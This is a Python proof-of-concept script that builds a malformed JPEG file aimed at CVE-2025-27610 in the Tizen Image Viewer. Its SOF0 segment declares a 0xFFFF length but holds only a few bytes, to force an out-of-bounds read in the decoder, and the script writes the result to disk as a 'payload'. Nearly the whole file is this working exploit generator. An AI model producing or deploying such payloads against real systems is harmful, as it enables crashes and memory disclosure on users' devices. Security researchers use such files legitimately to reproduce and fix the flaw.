#!/usr/bin/env python3
"""CVE-2025-27610 — Tizen Image Viewer. JPEG with an oversized declared
segment length (SOF0) vs actual data -> OOB read in the decoder."""
import struct, sys
from pathlib import Path

def _seg(marker: int, body: bytes, decl: int = None) -> bytes:
    ln = decl if decl is not None else len(body) + 2
    return bytes([0xFF, marker]) + struct.pack(">H", ln & 0xFFFF) + body

def build() -> bytes:
    out = bytearray(b"\xFF\xD8")                                    # SOI
    out += _seg(0xE0, b"JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00")
    out += _seg(0xDB, b"\x00" + bytes([16] * 64))                  # DQT
    # SOF0 declares a segment 0xFFFF long but delivers only 11 bytes
    out += _seg(0xC0, b"\x08\x00\x08\x00\x08\x01\x01\x11\x00", decl=0xFFFF)
    out += _seg(0xC4, b"\x00" + bytes([0] * 16) + bytes([0] * 16)) # minimal DHT
    out += _seg(0xDA, b"\x01\x01\x00\x00\x3F\x00")                 # SOS
    out += b"\x00" * 8
    out += b"\xFF\xD9"                                             # EOI
    return bytes(out)

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2025-27610.jpg")
    d = build(); out.write_bytes(d)
    print(f"[+] CVE-2025-27610 JPEG payload -> {out} ({len(d)} bytes)")

if __name__ == "__main__":
    main()
